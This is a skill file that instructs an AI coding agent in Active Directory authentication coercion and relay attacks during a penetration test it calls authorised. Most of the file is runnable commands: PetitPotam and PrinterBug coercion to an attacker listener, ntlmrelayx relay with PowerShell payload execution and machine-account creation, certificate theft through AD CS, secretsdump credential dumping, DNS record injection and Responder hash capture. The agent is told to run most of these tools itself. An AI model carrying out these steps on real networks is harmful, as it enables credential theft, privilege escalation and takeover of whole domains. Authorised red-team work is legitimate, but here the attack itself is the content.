---
name: auth-coercion-relay
description: >
  Forces remote systems to authenticate back to attacker-controlled listeners
  and relays captured authentication to escalate privileges or move laterally.
  Covers authentication coercion (PetitPotam, PrinterBug, DFSCoerce,
  ShadowCoerce, CheeseOunce), NTLM relay (ntlmrelayx to LDAP/SMB/AD CS/MSSQL),
  Kerberos relay (krbrelayx, mitm6), and name resolution poisoning
  (LLMNR/NBNS/WPAD via Responder).
keywords:
  - petitpotam
  - printerbug
  - coercion
  - ntlm relay
  - ntlmrelayx
  - responder
  - LLMNR
  - NBNS
  - WPAD
  - mitm6
  - krbrelayx
  - DFSCoerce
  - ShadowCoerce
  - relay to LDAP
  - relay to ADCS
  - ESC8
  - hash capture
  - authentication coercion
  - forced authentication
  - dns record injection
  - dnstool
  - scheduled task callback
  - UseDefaultCredentials
tools:
  - ntlmrelayx.py
  - krbrelayx.py
  - Responder
  - mitm6
  - PetitPotam
  - DFSCoerce
  - netexec
  - dnstool.py
opsec: high
---

# Authentication Coercion & Relay

You are helping a penetration tester force remote systems to authenticate
to attacker-controlled listeners and relay or capture those credentials for
privilege escalation and lateral movement. All testing is under explicit
written authorization.

**OPSEC exception — Kerberos-first does NOT apply**: Coercion and relay
attacks are inherently about manipulating authentication protocols (NTLM
or Kerberos) at the network layer. The Kerberos-first convention from
CLAUDE.md does not apply to the attack itself, though tool setup and
enumeration commands still use `-k -no-pass` where possible.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[auth-coercion-relay] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Domain user credentials (some coercion methods work unauthenticated)
- Network position: same VLAN as targets (for poisoning) or route to
  targets (for RPC coercion)
- Tools: `ntlmrelayx.py` (Impacket), `Responder`, `PetitPotam`,
  `DFSCoerce`, optionally `krbrelayx.py`, `mitm6`, `netexec`

**Kerberos-first workflow** (for enumeration and setup commands only):

```bash
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH
export KRB5CCNAME=user.ccache
# Enumeration commands below use -k -no-pass
```

## Privileged Commands

Claude Code cannot execute `sudo` commands. The following tools require root
and must be handed off to the user for manual execution:

- **ntlmrelayx.py** — NTLM relay listener (binds SMB/HTTP/LDAP ports, needs raw sockets)
- **responder** — LLMNR/NBNS/mDNS/WPAD poisoning (needs raw sockets)
- **krbrelayx.py** — Kerberos relay listener (needs raw sockets)
- **mitm6** — IPv6 DNS takeover (needs raw sockets)
- **systemctl** — stopping local services (e.g., `systemctl stop smbd` before relay)

**Handoff protocol:**

1. Present the full command including `sudo` to the user
2. Ask the user to run it in their terminal
3. Read output or wait for callback confirmation
4. Continue analysis based on results

**Non-privileged commands** Claude can execute directly:
- Coercion tools: `PetitPotam.py`, `DFSCoerce.py`, `printerbug.py`, `ShadowCoerce`, `CheeseOunce`
- DNS record injection: `dnstool.py` (krbrelayx — uses LDAP, no raw sockets)
- Enumeration: `netexec smb --gen-relay-list`, `certipy find`, `bloodyAD`
- Kerberos auth setup: `getTGT.py`, `export KRB5CCNAME`
- Post-relay exploitation: `getST.py`, `secretsdump.py`, `certipy auth`

Batch all pending privileged commands (relay listener + poisoner + coercion
trigger) so the user can start them in one pass.

## Step 1: Assess Relay Feasibility

Before coercing, check what relay targets are available.

### SMB Signing (Required for SMB Relay)

```bash
# Find hosts with SMB signing NOT required
nxc smb 10.10.10.0/24 --use-kcache --gen-relay-list relay-targets.txt

# Check specific hosts
nxc smb TARGET --use-kcache --signing
```

Signing status by OS (defaults):
| OS | SMB Signing | Notes |
|----|-------------|-------|
| Domain Controllers | Required | Always required |
| Server 2025 DC | Required | LDAP signing also required |
| Server 2022 23H2+ DC | Required | LDAP signing also required |
| Member servers 2019/2022 | **Not required** | Relay targets |
| Windows 10/11 pre-24H2 | **Not required** | Relay targets, WebClient installed |
| Windows 11 24H2+ | Required | New default |

### LDAP Signing (Required for LDAP Relay)

```bash
# Check LDAP signing (nxc or manual)
nxc ldap DC.DOMAIN.LOCAL --use-kcache -M ldap-checker

# Manual check via LDAP query
ldapsearch -H ldap://DC.DOMAIN.LOCAL -x -s base \
  -b "" "(objectClass=*)" supportedCapabilities
```

- **Pre-2025 DCs**: LDAP signing typically NOT required (relay works)
- **Server 2025 DCs**: LDAP signing required by default (relay blocked)
- LDAPS (port 636) requires channel binding — relay typically fails

### AD CS Enrollment (Required for Relay to ADCS)

```bash
# Find HTTP enrollment endpoints (vulnerable to relay)
nxc ldap DC.DOMAIN.LOCAL --use-kcache -M adcs
certipy find -k -no-pass -u user@DOMAIN.LOCAL -dc-ip DC_IP -stdout | grep "Web Enrollment"
```

If HTTP enrollment is enabled, NTLM relay to AD CS is viable (ESC8 path).

### WebClient Service (Enables HTTP-Based Coercion)

```bash
# Check WebClient status on targets (enables HTTP auth callback)
nxc smb 10.10.10.0/24 --use-kcache -M webdav
```

WebClient converts SMB UNC paths to HTTP, enabling coercion over HTTP
(which bypasses SMB signing requirements).

## Step 2: Choose Attack Path

| Scenario | Path | Go To |
|----------|------|-------|
| SMB signing disabled on targets | Coercion -> NTLM relay to SMB | Step 3 + Step 4A |
| LDAP signing not enforced on DC | Coercion -> NTLM relay to LDAP | Step 3 + Step 4B |
| AD CS HTTP enrollment available | Coercion -> NTLM relay to AD CS | Step 3 + Step 4C |
| WebClient enabled on target | HTTP coercion -> relay to LDAP | Step 3 + Step 4B |
| Kerberos relay viable | Coercion -> Kerberos relay to AD CS | Step 3 + Step 5 |
| Server 2022+: MIC enforced, LDAP signing on | Coercion -> **Kerberos relay** | Step 3 + Step 5 |
| No relay feasible | Capture hashes -> crack offline | Step 6 |
| Scheduled task resolves attacker-controlled DNS with NTLM | DNS record injection -> capture | Step 3B + Step 6 |
| On same VLAN, no creds | LLMNR/NBNS poisoning -> capture | Step 7 |

### Pivoted Relay (Target Behind SOCKS Tunnel)

When the relay target is only reachable through a SOCKS tunnel (chisel, ssh -D,
ligolo SOCKS):

**Do NOT use `proxychains ntlmrelayx.py`** — proxychains wraps ALL socket
calls including the listener. The relay listener must bind locally for the
coerced machine to reach it.

**Pattern — socat port forward for relay target only:**
```bash
# Forward relay target through SOCKS (runs in background)
socat TCP-LISTEN:LOCAL_PORT,fork,reuseaddr \
  SOCKS4A:127.0.0.1:TARGET_IP:TARGET_PORT,socksport=SOCKS_PORT &

# ntlmrelayx targets the local socat forward (listener stays local)
ntlmrelayx.py -t ldap://127.0.0.1:LOCAL_PORT -smb2support
```

| Relay Target | socat | ntlmrelayx `-t` |
|-------------|-------|-----------------|
| LDAP (389) | `TCP-LISTEN:10389 → TARGET:389` | `ldap://127.0.0.1:10389` |
| LDAPS (636) | `TCP-LISTEN:10636 → TARGET:636` | `ldaps://127.0.0.1:10636` |
| ADCS (80) | `TCP-LISTEN:10080 → CA:80` | `http://127.0.0.1:10080/certsrv/certfnsh.asp` |

**If NTLM relay fails through pivot** (Server 2022+ MIC enforcement), use
**krbrelayx** (Step 5) — Kerberos relay is not subject to MIC validation.

## Step 3: Authentication Coercion

Force a remote machine to authenticate back to your listener.

### Coercion Method Reference

| Method | Protocol | Pipe | Tool | Requires Auth | Notes |
|--------|----------|------|------|---------------|-------|
| PetitPotam | MS-EFSR | `\PIPE\efsrpc` / `\PIPE\lsarpc` | PetitPotam | No (unauthenticated on unpatched) | Most reliable for DCs |
| PrinterBug | MS-RPRN | `\PIPE\spoolss` | SpoolSample, printerbug.py | Yes | Requires Spooler running |
| DFSCoerce | MS-DFSNM | `\PIPE\netdfs` | DFSCoerce | Yes | Works on all DFS-enabled hosts |
| ShadowCoerce | MS-FSRVP | `\PIPE\FssagentRpc` | ShadowCoerce | Yes | VSS Agent service required |
| CheeseOunce | MS-EVEN | `\PIPE\even` | CheeseOunce | Yes | EventLog backup coercion |

### Cross-Forest Coercion: Hostname Required

When coercing across a forest trust with `ENABLE_TGT_DELEGATION`, the listener
argument **must be a hostname** (not an IP). IP causes NTLM fallback; hostname
forces Kerberos authentication, which triggers TGT forwarding to the listener
DC. See trust-attacks Step 6 for the full TGT delegation coercion methodology.

### NetExec coerce_plus (Automated Discovery)

```bash
# Test all coercion methods at once
nxc smb TARGET --use-kcache -M coerce_plus

# Test specific method
nxc smb TARGET --use-kcache -M coerce_plus -o METHOD=PetitPotam
nxc smb TARGET --use-kcache -M coerce_plus -o METHOD=PrinterBug
nxc smb TARGET --use-kcache -M coerce_plus -o METHOD=DFSCoerce
```

### PetitPotam (MS-EFSR) — Most Reliable

```bash
# Unauthenticated (unpatched DCs only)
python3 PetitPotam.py LISTENER_IP TARGET_DC

# Authenticated (works on patched DCs via lsarpc pipe)
python3 PetitPotam.py -u user -p 'password' -d DOMAIN.LOCAL \
  LISTENER_IP TARGET_DC
```

### PrinterBug (MS-RPRN)

```bash
# Check if Spooler is running
rpcdump.py DOMAIN/user@TARGET -k -no-pass | grep MS-RPRN

# Trigger callback
python3 printerbug.py DOMAIN/user@TARGET LISTENER_IP -k -no-pass
# Windows: SpoolSample.exe TARGET LISTENER_IP
```

### DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u user -d DOMAIN.LOCAL LISTENER_IP TARGET
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p password -d DOMAIN.LOCAL \
  LISTENER_IP TARGET
```

### MSSQL xp_dirtree (UNC Path Injection)

```bash
# If you have MSSQL access
EXEC xp_dirtree '\\LISTENER_IP\share', 1, 1
EXEC master.dbo.xp_fileexist '\\LISTENER_IP\share\file'
```

### Step 3B: DNS Record Injection (Scheduled Task / Script Callback)

When a scheduled task or service script resolves attacker-controllable DNS
names and authenticates with NTLM (e.g., PowerShell `Invoke-WebRequest`
with `-UseDefaultCredentials`), inject a DNS A-record pointing to the
attacker and capture the callback.

**When to use:** Discovery finds a script or scheduled task that:
- Resolves DNS names matching a pattern (e.g., `web*`, `monitor*`)
- Authenticates with NTLM (`-UseDefaultCredentials`, `net use`, UNC paths)
- Runs as a privileged user (service account, admin, etc.)

**Common examples:** monitoring scripts, health check scripts, backup
scripts that connect to hosts by DNS name.

**Requirements:**
- Domain user credentials (default AD permissions allow creating DNS records)
- `dnstool.py` from the [krbrelayx](https://github.com/dirkjanm/krbrelayx)
  toolkit (handles AD DNS binary format correctly)
- Responder or other NTLM capture tool

#### 1. Add DNS A-Record

Use `dnstool.py` from krbrelayx — it handles the `dnsRecord` binary
attribute format correctly. **Do NOT craft the binary record manually** —
the format includes zone serial number, TTL byte order, and timestamp
fields that must match the zone's SOA record. Manual crafting is the
most common failure mode for this technique.

```bash
# Add A-record pointing to attacker IP
# -u: domain user creds (NTLM auth — no Kerberos needed)
# -a add: add a new record
# -r: record name (must match the pattern the script resolves)
# -d: IP address to point to (attacker)
# -t A: record type (A = IPv4 address)
python3 dnstool.py -u 'DOMAIN.LOCAL\user' -p 'password' DC_IP \
  -a add -r 'RECORDNAME.DOMAIN.LOCAL' -d ATTACKER_IP -t A

# Example: script resolves web*.intelligence.htb
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' \
  -p 'NewIntelligenceCorpUser9876' 10.129.1.166 \
  -a add -r 'webpwned.intelligence.htb' -d 10.10.14.67 -t A
```

If `dnstool.py` is not in `$PATH`, clone krbrelayx:
```bash
git clone https://github.com/dirkjanm/krbrelayx.git /tmp/krbrelayx
python3 /tmp/krbrelayx/dnstool.py ...
```

#### 2. Verify DNS Resolution

**Critical step — do not skip.** Confirm the DC's DNS server actually
serves the record, not just that it exists in LDAP. AD-integrated DNS
can have records in LDAP that DNS ignores (wrong binary format, wrong
container, stale zone transfer).

```bash
# Query the DC's DNS server directly
dig @DC_IP RECORDNAME.DOMAIN.LOCAL A +short

# Or with nslookup
nslookup RECORDNAME.DOMAIN.LOCAL DC_IP
```

**Expected:** Returns attacker IP.
**If NXDOMAIN:** See Troubleshooting → "DNS Record in LDAP but Not Served."

#### 3. Start Listener

Start Responder (privileged — use `start_process` with `privileged: true`
for shell-server, or hand off to operator):

```bash
# Responder in capture mode on the correct interface
sudo responder -I tun0 -v

# Or minimal — HTTP only (if script uses HTTP)
sudo responder -I tun0 -v
```

**Port conflicts:** If port 80 or 445 is already in use, stop the
conflicting service first. Responder will fail silently if it can't bind.

**Responder is a daemon, not an interactive shell.** After starting it with
`start_process(privileged=True)`, do NOT use `send_command()` or
`read_output()` to monitor it — Responder does not read stdin and its PTY
output is unreliable for monitoring. Instead:

1. **Start and forget**: Call `start_process(command="responder -I tun0 -v",
   privileged=True)`. Note the session ID but do not interact with it.
2. **Verify it's running**: Use a *separate* Bash command to confirm
   Responder bound its ports: `ss -tlnp | grep -E ':(80|445|389)\s'`
3. **Monitor via log files**: Responder writes captured hashes to
   `/opt/Responder/logs/` inside the Docker container. To check for
   captures, exec into the container:
   ```bash
   # Find the container ID
   docker ps --filter ancestor=red-run-shell --format '{{.ID}}'
   # Check for captured hashes
   docker exec CONTAINER_ID ls /opt/Responder/logs/
   docker exec CONTAINER_ID cat /opt/Responder/logs/Responder-Session.log
   ```
   Run these via Bash, not via `send_command()` on the Responder session.
4. **Wait patiently**: After planting the coercion trigger (SCF, desktop.ini,
   DNS record), wait 2–5 minutes, then check logs. Do not burn turns polling
   the PTY session.

#### 4. Wait for Callback

The script runs on its schedule (typically every 1–15 minutes). Monitor
Responder **log files** (not PTY output) for NTLMv2 hashes. Allow at least
**two full cycles** before concluding the technique failed.

Expected log output:
```
[HTTP] NTLMv2 Client   : 10.10.10.5
[HTTP] NTLMv2 Username : DOMAIN\ServiceUser
[HTTP] NTLMv2 Hash     : ServiceUser::DOMAIN:challenge:response:blob
```

Check logs by execing into the Responder container (see step 3 above).

#### 5. Save and Return

Save the hash and return to the orchestrator:
```bash
# Find the Responder container
CONTAINER=$(docker ps --filter ancestor=red-run-shell --format '{{.ID}}' | head -1)

# Copy hashes out of the container
docker cp "$CONTAINER:/opt/Responder/logs/" /tmp/responder-logs/
cp /tmp/responder-logs/*NTLMv2*.txt \
  engagement/evidence/<username>-ntlmv2-hash.txt

# Or copy directly from Responder session log
docker exec "$CONTAINER" grep -i ntlmv2 /opt/Responder/logs/Responder-Session.log \
  > engagement/evidence/<username>-ntlmv2-hash.txt
```

Return with: hash file path, hashcat mode 5600, source username,
routing recommendation to **credential-cracking**.

#### Cleanup

After capturing the hash, remove the injected DNS record:

```bash
python3 dnstool.py -u 'DOMAIN.LOCAL\user' -p 'password' DC_IP \
  -a remove -r 'RECORDNAME.DOMAIN.LOCAL' -t A
```

## Step 4: NTLM Relay

Relay captured NTLM authentication to a target service.

### Step 4A: Relay to SMB (Remote Code Execution)

Requires SMB signing **not required** on target.

```bash
# Start relay listener (target list from Step 1)
sudo ntlmrelayx.py -tf relay-targets.txt -smb2support

# With command execution
sudo ntlmrelayx.py -tf relay-targets.txt -smb2support \
  -c "powershell -e BASE64_PAYLOAD"

# Interactive SOCKS proxy (access multiple services through relay)
sudo ntlmrelayx.py -tf relay-targets.txt -smb2support -socks
# Then:
proxychains smbclient //TARGET/C$ -U DOMAIN/MACHINE$ -no-pass
proxychains secretsdump.py DOMAIN/MACHINE$@TARGET -no-pass
```

### Step 4B: Relay to LDAP (Machine Account / RBCD / ACL Abuse)

Requires LDAP signing **not enforced** on target DC. Relay over LDAPS
requires no channel binding.

```bash
# Create machine account via relay (uses MachineAccountQuota)
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL --add-computer \
  FAKECOMPUTER$ Password123 -smb2support

# Set RBCD via relay (delegate from attacker machine to target)
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL --delegate-access \
  -smb2support

# Escalate user via relay (add user to group, modify ACLs)
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL \
  --escalate-user attacker_user -smb2support
```

After RBCD setup:
```bash
# Get service ticket via S4U
getST.py -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator \
  DOMAIN.LOCAL/FAKECOMPUTER$:Password123
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
secretsdump.py DOMAIN/Administrator@TARGET.DOMAIN.LOCAL -k -no-pass
```

### Step 4C: Relay to AD CS (Certificate Enrollment)

Relay NTLM auth to AD CS HTTP enrollment to obtain a certificate.

```bash
# ntlmrelayx to AD CS
sudo ntlmrelayx.py -t http://CA.DOMAIN.LOCAL/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# certipy relay
certipy relay -target http://CA.DOMAIN.LOCAL/certsrv/certfnsh.asp \
  -template DomainController
```

After obtaining certificate, authenticate via PKINIT:
```bash
certipy auth -pfx dc.pfx -dc-ip DC_IP
# or
python3 gettgtpkinit.py -cert-pfx dc.pfx DOMAIN.LOCAL/DC$ dc.ccache
export KRB5CCNAME=dc.ccache
secretsdump.py DOMAIN/DC$@DC.DOMAIN.LOCAL -k -no-pass
```

For full AD CS relay exploitation (ESC8/ESC11), route to **adcs-access-and-relay**.

### Step 4D: Relay to MSSQL

```bash
# Relay to MSSQL for command execution
sudo ntlmrelayx.py -t mssql://SQL.DOMAIN.LOCAL -smb2support \
  -q "EXEC xp_cmdshell 'whoami'"

# Interactive MSSQL via SOCKS
sudo ntlmrelayx.py -t mssql://SQL.DOMAIN.LOCAL -smb2support -socks
proxychains mssqlclient.py DOMAIN/MACHINE$@SQL.DOMAIN.LOCAL \
  -windows-auth -no-pass
```

## Step 5: Kerberos Relay

Relay Kerberos authentication instead of NTLM — avoids NTLM signing
checks but limited to same-host relay (shares machine account key).

### Kerberos Relay to AD CS (via LLMNR + Responder)

```bash
# Start Responder (only poison, don't serve)
python3 Responder.py -I eth0 -N PKI_SERVER_NETBIOS

# Start krbrelayx targeting AD CS HTTP enrollment
sudo python3 krbrelayx.py \
  --target 'http://CA.DOMAIN.LOCAL/certsrv/' \
  -ip ATTACKER_IP --adcs --template Machine -debug
```

### Kerberos Relay to AD CS (via DNS + mitm6)

```bash
# Start krbrelayx
sudo krbrelayx.py \
  --target http://CA.DOMAIN.LOCAL/certsrv/ \
  -ip ATTACKER_IP --victim TARGET.DOMAIN.LOCAL \
  --adcs --template Machine

# Start mitm6 for IPv6 DNS takeover
sudo mitm6 --domain DOMAIN.LOCAL \
  --host-allowlist TARGET.DOMAIN.LOCAL \
  --relay CA.DOMAIN.LOCAL -v
```

After obtaining certificate:
```bash
python3 gettgtpkinit.py -pfx-base64 CERT_B64 \
  DOMAIN.LOCAL/TARGET$ target.ccache
export KRB5CCNAME=target.ccache
secretsdump.py DOMAIN/TARGET$@TARGET.DOMAIN.LOCAL -k -no-pass
```

### Kerberos Relay to LDAP — NOT VIABLE

> **LDAP auto-negotiates signing with Kerberos auth.** When krbrelayx relays
> a Kerberos AP-REQ to LDAP, the server sees Kerberos authentication and
> automatically enables LDAP signing — regardless of the server's signing
> policy. This breaks the relay. Unlike NTLM (where signing is optional and
> policy-dependent), Kerberos + LDAP always signs.
>
> **krbrelayx targets are limited to:** ADCS HTTP enrollment (ESC8), SMB
> (if signing not required — rare), and other HTTP services. Never LDAP.
>
> Ref: [Synacktiv — Relaying Kerberos over SMB](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx)

### Kerberos Reflection (CVE-2025-33073)

Relay a machine's Kerberos auth back to itself via DNS record trick:

```bash
# Create special DNS record (authenticated)
dnstool.py -u 'DOMAIN.LOCAL\user' -p 'Password' DC_IP \
  -a add -r 'target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
  -d ATTACKER_IP

# Start krbrelayx for reflection
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Trigger coercion using the crafted hostname
petitpotam.py -d DOMAIN.LOCAL -u user -p 'Password' \
  'target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
  TARGET.DOMAIN.LOCAL
```

## Step 6: Hash Capture (No Relay Available)

When relay is not feasible, capture NetNTLM hashes for offline cracking.

**Do NOT crack hashes in this skill.** Save captured hashes to
`engagement/evidence/` and return to the orchestrator with the hash file
path, hash type (NTLMv1 mode 5500 or NTLMv2 mode 5600), and a routing
recommendation to **credential-cracking**. The orchestrator will spawn
the credential-cracking-agent for offline cracking.

### Responder (Capture Mode)

```bash
# Capture NetNTLMv2 hashes
sudo responder -I eth0 -wfrd -P -v

# Hashes saved to /usr/share/responder/logs/
```

### NTLMv1 Downgrade (When LmCompatibilityLevel Allows)

If `LmCompatibilityLevel <= 1` (send LM & NTLM response):

```bash
# Set challenge to known value for rainbow table lookup
# Edit Responder.conf: Challenge = 1122334455667788
sudo responder -I eth0 --lm --disable-ess

# NTLMv1 hashes with magic challenge can be cracked via shuck.sh
# Save hash file and route to credential-cracking (hashcat mode 5500)
```

### Coercion for Hash Capture (Without Relay)

```bash
# Start Responder, then coerce
sudo responder -I eth0 -v
python3 PetitPotam.py ATTACKER_IP TARGET_DC
# Captured machine$ NetNTLM hash -> save and return for cracking
```

### After Capture

Save the hash to `engagement/evidence/<target>-ntlmv2-hash.txt` and return
to the orchestrator with:
- Hash file path
- Hash type and hashcat mode (NTLMv2 = 5600, NTLMv1 = 5500)
- Source username and domain
- Routing recommendation: **credential-cracking**

## Step 7: Name Resolution Poisoning (LLMNR/NBNS/WPAD)

Poison multicast name resolution to capture hashes from machines
requesting nonexistent hostnames.

### Responder (LLMNR + NBNS + WPAD)

```bash
# Full poisoning mode
sudo responder -I eth0 -wfrd -P -v

# Passive analysis first (see what's being requested)
sudo responder -I eth0 -A
```

### mitm6 (IPv6 DNS Takeover)

More stealthy than LLMNR poisoning — exploits IPv6 auto-configuration.

```bash
# IPv6 DNS takeover -> relay to LDAP
sudo mitm6 -i eth0 -d DOMAIN.LOCAL

# Combine with ntlmrelayx
sudo ntlmrelayx.py -6 -wh ATTACKER_IP \
  -t ldaps://DC.DOMAIN.LOCAL --add-computer -smb2support
```

### Inveigh (Windows Alternative)

```powershell
# PowerShell
Import-Module .\Inveigh.psd1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# InveighZero (C# binary)
.\Inveigh.exe
```

## Step 8: Advanced Relay Techniques

### Drop the MIC (CVE-2019-1040)

> **Patched on Server 2022+ (KB5005413+).** MIC enforcement is mandatory —
> `--remove-mic` has no effect. Route to **Kerberos relay** (Step 5) instead.

Remove the MIC (Message Integrity Code) from NTLM relay to bypass
NTLM signing on the relay path (pre-2022 targets only):

```bash
# Remove MIC and escalate via LDAP
sudo ntlmrelayx.py --remove-mic --escalate-user attacker \
  -t ldap://DC.DOMAIN.LOCAL -smb2support

# Remove MIC and set RBCD
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL --remove-mic \
  --delegate-access -smb2support
```

### Ghost Potato (CVE-2019-1384)

Local privilege escalation via NTLM relay with DCOM:

```bash
sudo ntlmrelayx.py -t ldaps://DC.DOMAIN.LOCAL \
  --gpotato-startup 'C:\Windows\System32\cmd.exe /c net localgroup Administrators attacker /add'
```

### NTLM Reflection (CVE-2025-33073)

Relay a machine's NTLM auth back to itself via DNS TXT record:

```bash
dnstool.py -u 'DOMAIN.LOCAL\user' -p 'Password' DC_IP \
  -a add -r 'target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
  -d ATTACKER_IP
ntlmrelayx.py -t smb://TARGET.DOMAIN.LOCAL -smb2support
```

## Step 9: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### Relay Fails with "LDAP Signing Required"

LDAP relay requires signing NOT enforced. Check:
```bash
nxc ldap DC.DOMAIN.LOCAL --use-kcache -M ldap-checker
```
If signing is required, relay to AD CS (HTTP) or SMB instead.

### Coercion Returns "Access Denied"

- PetitPotam unauthenticated was patched — use authenticated mode
- PrinterBug requires Spooler service running — check with rpcdump
- Try alternate coercion methods (DFSCoerce, ShadowCoerce)
- WebClient-based HTTP coercion may bypass SMB-level blocks

### ntlmrelayx Hangs or No Callback

- Verify listener IP is reachable from target network
- Check firewall allows inbound on port 445 (SMB) or 80/443 (HTTP)
- Stop local SMB service: `sudo systemctl stop smbd` (requires root — present to user)
- Stop local HTTP service if relaying HTTP

### NTLM Relay Rejected on Server 2022+ (MIC Enforcement)

Symptoms: relay completes NTLM handshake but target rejects auth.
`--remove-mic` has no effect. Server 2022+ enforces MIC (CVE-2019-1040
patched). **Fix:** Use Kerberos relay (Step 5) — not subject to MIC. Do not
retry ntlmrelayx variants.

### MachineAccountQuota is 0

Default `ms-DS-MachineAccountQuota` is 10. If set to 0:
- Cannot create machine accounts via relay
- Use `--delegate-access` instead (modifies existing object)
- Or relay to AD CS for certificate-based escalation

### DNS Record in LDAP but Not Served

The record appears in LDAP (`ldapsearch` shows it in `DomainDnsZones`) but
`dig @DC_IP` returns NXDOMAIN. Causes:

1. **Wrong binary format** — the `dnsRecord` attribute uses a Microsoft-
   specific binary encoding with zone serial, TTL, and timestamp fields.
   If any field is malformed, the DNS server ignores the record silently.
   **Fix:** Use `dnstool.py` from krbrelayx — it reads the zone SOA to
   get the correct serial number and constructs valid binary blobs. Never
   craft the binary record manually via `ldapmodify` or Python LDAP.

2. **Wrong container** — AD DNS records live under
   `DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=<domain>,...`.
   Records placed elsewhere (e.g., under `CN=MicrosoftDNS,CN=System`)
   are not served by the DNS server. `dnstool.py` uses the correct
   container by default.

3. **DNS cache / zone transfer delay** — AD-integrated DNS zones update
   from LDAP, but there can be a brief delay. Wait 30–60 seconds and
   retry `dig`. If it still fails after 2 minutes, the binary format
   is likely wrong.

4. **Record name collision** — if a record with the same name already
   exists (including tombstoned records), the add may silently fail or
   create a duplicate that DNS ignores. Check for existing records:
   ```bash
   python3 dnstool.py -u 'DOMAIN\user' -p 'pass' DC_IP \
     -a query -r 'RECORDNAME.DOMAIN.LOCAL' -t A
   ```
   If a stale record exists, remove it first with `-a remove`, then re-add.

**If `dnstool.py` itself fails** (connection error, access denied):
- Verify the user has domain user privileges (default allows DNS record
  creation in `DomainDnsZones`)
- Check LDAP connectivity: `ldapsearch -H ldap://DC_IP -x -b "" -s base`
- Clock skew can affect the LDAP bind — sync clock if needed

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This applies to the
initial LDAP enumeration phase (authenticated coercion endpoint discovery), not
to the relay attack itself (which uses NTLM). This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM for the Kerberos-authenticated operations. The fix requires
root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### OPSEC Comparison

| Technique | Network Artifacts | Detection Events | Risk |
|-----------|------------------|------------------|------|
| LLMNR/NBNS poisoning | Broadcast responses | Network anomaly | **HIGH** |
| mitm6 IPv6 DNS | DHCPv6 + DNS replies | Less monitored | **MEDIUM** |
| PetitPotam (authenticated) | RPC call + SMB callback | 4624 + 4776 | **MEDIUM** |
| PrinterBug | RPC + Spooler callback | 4624 + 4776 | **MEDIUM** |
| NTLM relay to SMB | SMB auth forwarding | 4624 type 3 | **HIGH** |
| NTLM relay to LDAP | LDAP bind forwarding | 4662 | **HIGH** |
| NTLM relay to AD CS | HTTP enrollment | Certificate issued | **MEDIUM** |
| Kerberos relay | Kerberos AP-REQ forward | 4769 | **LOW** |
